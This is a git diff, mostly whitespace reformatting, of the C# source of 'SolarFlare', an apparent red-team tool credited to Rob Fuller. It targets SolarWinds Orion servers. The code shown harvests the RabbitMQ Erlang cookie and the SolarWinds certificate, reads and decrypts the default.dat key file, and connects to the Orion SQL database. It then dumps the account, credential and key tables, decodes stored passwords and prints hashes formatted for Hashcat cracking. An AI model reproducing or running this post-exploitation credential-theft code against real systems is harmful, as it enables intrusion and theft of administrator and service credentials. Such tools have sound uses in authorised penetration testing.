@@ -12,30 +12,30 @@ using Microsoft.Win32;
 
 namespace SolarFlare
 {
-    class Program
-    {
+	class Program
+	{
 		internal static FlareData flare = new FlareData();
 		static void Main(string[] args)
-        {
+        	{
 			Console.WriteLine("Don't look directly into the sun...");
 			Console.WriteLine("Tool created by Rob Fuller (@mubix)");
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Collecting RabbitMQ Erlang Cookie");
-            flare.ErlangCookie = GetErlangCookie();
+            		flare.ErlangCookie = GetErlangCookie();
 			if(!(string.IsNullOrEmpty(flare.ErlangCookie)))
-            {
+            		{
 				Console.WriteLine("| \tErlang Cookie: " + flare.ErlangCookie);
 			}
 			else
-            {
+			{
 				Console.WriteLine("| \tErlang Cookie: Not found!");
-            }
+			}
 
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Collecting SolarWinds Certificate");
 			flare.CertData = GetCertificate();
 			if(flare.CertData.IsPresent)
-            {
+			{
 				Console.WriteLine("| \tSubject Name: " + flare.CertData.Cert.Subject);
 				Console.WriteLine("| \tThumbprint  : " + flare.CertData.Cert.Thumbprint);
 				if (flare.CertData.Exported)
@@ -45,19 +45,19 @@ namespace SolarFlare
 				}
 			}
 			else
-            {
+			{
 				Console.WriteLine("| Certificate NOT FOUND. Some decryption will fail...");
-            }
+			}
 
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Collecting Default.DAT file");
 			flare.Dat = GetDat();
 			if (flare.Dat.IsPresent)
-            {
+			{
 				Console.WriteLine("| \tEncrypted: " + flare.Dat.DatEncryptedHex);
 			}
 			if (flare.Dat.Decrypted)
-            {
+			{
 				Console.WriteLine("| \tDecrypted: " + flare.Dat.DatDecryptedHex);
 			}
 
@@ -68,16 +68,16 @@ namespace SolarFlare
 
 			Console.WriteLine("============================================");
 			Console.WriteLine("| Connecting to the Database              |");
-            bool connected = CheckDbConnection();
-            if (connected)
+			bool connected = CheckDbConnection();
+			if (connected)
 			{
 				DumpDBCreds();
 				flare.Db.Connection.Close();
 			}
 			else
-            {
+			{
 				Console.WriteLine("| \tAll Database connections failed. We have done all we can do here...");
-            }
+			}
 			Console.WriteLine("============================================");
 			Console.WriteLine("============================================");
 
@@ -136,14 +136,14 @@ namespace SolarFlare
 		static FlareData.DatHex GetDat()
 		{
 			FlareData.DatHex dat = new FlareData.DatHex();
-            string path = Environment.GetEnvironmentVariable("programdata");
+			string path = Environment.GetEnvironmentVariable("programdata");
 			path += "\\SolarWinds\\KeyStorage\\CryptoHelper\\default.dat";
 			if (File.Exists(path))
 			{
 				using (BinaryReader binaryReader = new BinaryReader(File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read)))
 				{
-                    int keyid = binaryReader.ReadInt32();
-                    int count = binaryReader.ReadInt32();
+					int keyid = binaryReader.ReadInt32();
+					int count = binaryReader.ReadInt32();
 					dat.DatEncrypted = binaryReader.ReadBytes(count);
 					dat.DatEncryptedHex = BitConverter.ToString(dat.DatEncrypted).Replace("-", "");
 					dat.IsPresent = true;
@@ -161,10 +161,10 @@ namespace SolarFlare
 				}
 			}
 			else
-            {
+			{
 				Console.WriteLine("| \tFailed to access Default.dat file");
 				Console.WriteLine("| \tThis will result in a failure to decrypt AES encrypted passwords");
-            }
+			}
 			return dat;
 		}
 
@@ -180,20 +180,20 @@ namespace SolarFlare
 			// SWNetPerfMon is where the database configuration is, it's a simple text file
 			string perfmondb = "";
 			try
-            {
+			{
 				RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\SolarWinds\\Orion\\Core");
 				if (key != null)
-                {
+				{
 					object installpathkey = key.GetValue("InstallPath");
 					if (installpathkey != null)
-                    {
+					{
 						perfmondb = installpathkey as String;
 						perfmondb += "SWNetPerfMon.DB";
 					}
-                }
+				}
 			}
 			catch
-            {
+			{
 				perfmondb = Environment.GetEnvironmentVariable("programfiles(x86)");
 				perfmondb += "\\SolarWinds\\Orion\\SWNetPerfMon.DB";
 			}
@@ -294,13 +294,13 @@ namespace SolarFlare
 								cred.DbDB + ";User ID=" + cred.DbUser +
 								";Password=" + cred.DbPass);
 							try
-                            {
+							{
 								flare.Db.Credentials.Add(cred);
 							}
 							catch (Exception e)
-                            {
+							{
 								Console.WriteLine(e);
-                            }
+							}
 
 						}
 						else if (text.StartsWith("Connection"))
@@ -313,61 +313,61 @@ namespace SolarFlare
 		}
 
 		static bool CheckDbConnection()
-        {
+		{
 			if(flare.Db.Credentials.Count > 0)
-            {
+			{
 				foreach(FlareData.FlareDB.DbCredential sql in flare.Db.Credentials)
-                {
+				{
 					SqlConnection sqlconn = new SqlConnection();
 					sqlconn.ConnectionString = "Server=" + sql.DbHost + ";Database=" + sql.DbDB + ";User ID=" + sql.DbUser + ";Password=" + sql.DbPass;
 					sqlconn.ConnectionString += ";MultipleActiveResultSets=true";
 					try
-                    {
+					{
 						sqlconn.Open();
 						if (sqlconn.State == System.Data.ConnectionState.Open)
-                        {
+						{
 							Console.WriteLine("| \tSuccessfully connected to: {0}", sqlconn.ConnectionString);
 							flare.Db.Connection = sqlconn;
 							break;
-                        }
-                    }
+						}
+					}
 					catch
 					{
 						Console.WriteLine($"| \tConnection failed to: {sqlconn.ConnectionString}");
 					}
 				}
-            }
+			}
 			if(flare.Db.Connection.State == System.Data.ConnectionState.Open)
-            {
+			{
 				return true;
-            }
+			}
 			else
-            {
+			{
 				return false;
-            }
-        }
+			}
+		}
 
 		// Decryption Functions
 		static string Decrypt(string encString)
-        {
-            string decrypted;
-            if (encString.StartsWith("<"))
-            {
+		{
+			string decrypted;
+			if (encString.StartsWith("<"))
+			{
 				XmlDocument xmlDocument = new XmlDocument();
 				xmlDocument.LoadXml(encString);
 				new System.Security.Cryptography.Xml.EncryptedXml(xmlDocument).DecryptDocument();
 				decrypted = xmlDocument.FirstChild.InnerText;
 			}
 			else if(encString.StartsWith("-"))
-            {
+			{
 				decrypted = DecryptAes(encString);
-            }
+			}
 			else
-            {
+			{
 				decrypted = DecryptString(encString);
-            }
+			}
 			return decrypted;
-        }
+		}
 
 		static string DecryptString(string encString)
 		{
@@ -433,7 +433,7 @@ namespace SolarFlare
 		// It might still store the credentials in the old format
 		// which can be decoded using long divion.
 		static string DecodeOldPassword(string password)
-        {
+		{
 			if (string.IsNullOrEmpty(password))
 			{
 				return string.Empty;
@@ -457,8 +457,8 @@ namespace SolarFlare
 				text += password[password.Length - 1];
 			}
 			password = text;
-            Int64.TryParse(value, out long divisor);
-            text = longDivision(password, divisor);
+			Int64.TryParse(value, out long divisor);
+			text = longDivision(password, divisor);
 			text = longDivision(text, 1244352345234);
 			text = text.Substring(1);
 			password = string.Empty;
@@ -512,17 +512,17 @@ namespace SolarFlare
 		// Database Functions
 
 		static void DumpDBCreds()
-        {
+		{
 			// code from: https://stackoverflow.com/a/6671427
 			DataTable schema = flare.Db.Connection.GetSchema("Tables");
 			List<string> TableNames = new List<string>();
 			foreach (DataRow row in schema.Rows)
-            {
+			{
 				TableNames.Add(row[2].ToString());
-            }
+			}
 
 			if(TableNames.Contains("Key"))
-            {
+			{
 				Console.WriteLine("============================================");
 				Console.WriteLine("| DB - Exporting Key Table                 |");
 				ExportKeyTable();
@@ -545,7 +545,7 @@ namespace SolarFlare
 		// I honestly don't know what they keys are used for, if anything.
 		// Will have to research this in the future...
 		static void ExportKeyTable()
-        {
+		{
 			try
 			{
 				using (SqlCommand command = new SqlCommand("SELECT keyid, encryptedkey, " +
@@ -569,13 +569,13 @@ namespace SolarFlare
 				}
 			}
 			catch (Exception e)
-            {
+			{
 				Console.WriteLine("| [-] Something went wrong: {0}", e);
-            }
-        }
+			}
+		}
 
 		static List<string> GetColumnList(string tablename)
-        {
+		{
 			List<string> columnlist = new List<string>();
 			using (SqlCommand command = new SqlCommand($"select c.name from sys.columns c inner join sys.tables t" +
 				" on t.object_id = c.object_id and t.name = '" + tablename + "' and t.type = 'U'", flare.Db.Connection))
@@ -591,25 +591,25 @@ namespace SolarFlare
 		}
 
 		static void ExportAccountsTable()
-        {
+		{
 			List<string> columnlist = new List<string>();
 			columnlist = GetColumnList("Accounts");
 			if(columnlist.Contains("Password"))
-            {
+			{
 				using (SqlCommand command = new SqlCommand("SELECT accountid, password, " +
 					"passwordhash, accountenabled, allowadmin, lastlogin, accountsid, " +
 					"groupinfo from [dbo].[Accounts]", flare.Db.Connection))
 				using (SqlDataReader reader = command.ExecuteReader())
-                {
+				{
 					while (reader.Read())
 					{
 						if (!reader.IsDBNull(0)) { Console.WriteLine("|\t Account: " + reader.GetString(0)); }
 						if (!reader.IsDBNull(1)) { Console.WriteLine("|\t Password: " + reader.GetString(1)); }
 						try
-                        {
+						{
 							string password = DecodeOldPassword(reader.GetString(1));
 							Console.WriteLine("|\t Decoded Password: " + password);
-                        }
+						}
 						catch { }
 						if (!reader.IsDBNull(2)) { Console.WriteLine($"|\t Hashcat Mode 21500: $solarwinds$0${reader.GetString(0).ToLower()}${reader.GetString(2)}"); }
 						if (!reader.IsDBNull(3)) { Console.WriteLine("|\t Account Enabled: " + reader.GetString(3)); }
@@ -624,7 +624,7 @@ namespace SolarFlare
 
 			}
 			else
-            {
+			{
 				using (SqlCommand command = new SqlCommand("SELECT accountid, passwordhash, passwordsalt, " +
 					"accountenabled, allowadmin, lastlogin, accountsid, " +
 					"groupinfo from [dbo].[Accounts]", flare.Db.Connection))
@@ -661,7 +661,7 @@ namespace SolarFlare
 		}
 
 		static void ExportCredsTable()
-        {
+		{
 			try
 			{
 				using (SqlCommand command = new SqlCommand("SELECT id, name, description, " +
@@ -740,7 +740,7 @@ namespace SolarFlare
 		}
 
 		internal class FlareData
-        {
+		{
 
 			internal class FlareDB
 			{
@@ -782,8 +782,6 @@ namespace SolarFlare
 			internal string CertPass { get; set; }
 			internal string ErlangCookie { get; set; }
 			internal FlareDB Db { get; set; } = new FlareDB();
-
-
 		}
 	}
 
